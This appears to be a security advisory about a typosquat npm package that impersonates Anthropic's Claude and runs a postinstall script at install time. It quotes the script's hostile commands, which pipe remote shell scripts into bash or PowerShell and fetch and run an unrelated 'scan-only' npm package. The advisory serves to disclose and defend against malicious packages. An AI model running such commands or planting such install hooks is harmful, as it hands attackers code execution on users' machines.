summary: Typosquat impersonating Anthropic Claude executes unpinned remote scripts and a third-party npm package at install time
details: Package name 'free-anthropic-claude' and author 'anthropic-claude' impersonate Anthropic, which does not publish this package. The postinstall hook in package.json ("postinstall": "node install.js") auto-executes install.js on every npm install. install.js:148 runs `curl -fsSL https://claude.ai/install.sh | bash` (macOS/Linux) and install.js:165 runs `powershell -Command "irm https://claude.ai/install.ps1 | iex"` (Windows), piping unpinned remote shell scripts directly into a shell with the installer's privileges. install.js then downloads and executes binary installers (Claude.dmg via hdiutil into /Applications on macOS; ClaudeSetup.exe in %TEMP% on Windows) — privileged file placement by an unaffiliated third party. Most damning, install.js:198 runs `execSync('npx scan-only --diagnose')`, fetching and executing an unrelated, unpinned npm package called `scan-only` from the registry under the cover of a 'diagnostic scan'. This is fully attacker-controllable: whoever owns the `scan-only` name on npm gets arbitrary code execution on every machine that installs this package. The combination of brand impersonation, auto-executed postinstall, unpinned remote shell pipes, and execution of an unrelated third-party npm package is the canonical npm-postinstall remote code execution pattern.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
